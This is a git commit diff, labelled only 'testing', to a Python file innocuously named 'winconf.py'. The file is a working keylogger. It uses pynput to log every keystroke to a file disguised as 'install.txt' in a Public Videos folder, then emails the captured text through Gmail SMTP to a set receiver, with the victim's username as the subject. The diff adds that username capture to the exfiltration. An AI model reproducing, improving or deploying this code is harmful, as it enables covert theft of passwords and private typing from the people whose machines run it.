4d64501d2b1d170b309218625cd48c3023652f81
Daniel Gromak <huntadonis@gmail.com>
2017-10-01 20:38:52 +0200

    testing

--- winconf.py
+++ winconf.py
@@ -1,27 +1,36 @@
 from pynput import keyboard
-from config import *
 from multiprocessing import Queue
-import smtplib, os, time
+import smtplib, os, time, getpass
+from config import *
 
 file ="C:/Users/Public/Videos/install.txt"
+last_time = 0
+username = getpass.getuser()
+file_info = os.stat(file)
+file_size = file_info.st_size
 
-def send(msg):
+def send(msg, subject):
+    email_text = "\r\n".join([
+      "From: " + SENDER_EMAIL,
+      "To: "+ RECIEVER_EMAIL,
+      "Subject: "+subject,
+      "",
+      msg
+      ])
     server = smtplib.SMTP('smtp.gmail.com:587')
     server.ehlo()
     server.starttls()
     server.login(SENDER_EMAIL, SENDER_PASSWORD)
-    server.sendmail(SENDER_EMAIL, RECIEVER_EMAIL, msg)
+    server.sendmail(SENDER_EMAIL, RECIEVER_EMAIL, email_text)
     server.quit()
-
-last_time = 0
 
 def on_press(key):
     global last_time
+    if time.time() - last_time > 1:
+        f = open(file, 'a')
+        f.write(' \n')
+        f.close()
     try:
-        if time.time() - last_time > 1:
-            f = open(file, 'a')
-            f.write(' \n')
-            f.close()
         f = open(file, 'a')
         f.write(key.char + '\n')
         f.close()
@@ -34,15 +43,12 @@ def on_press(key):
             
     last_time = time.time()
 
-file_info = os.stat(file)
-file_size = file_info.st_size
-
 if(file_size > 50):
     with open(file, 'r') as f:
         msg = f.read()
-    send(msg)
+    send(msg, username)
     open(file, 'w').close()
-# Collect events until released
+
 with keyboard.Listener(
         on_press=on_press) as listener:
     listener.join()
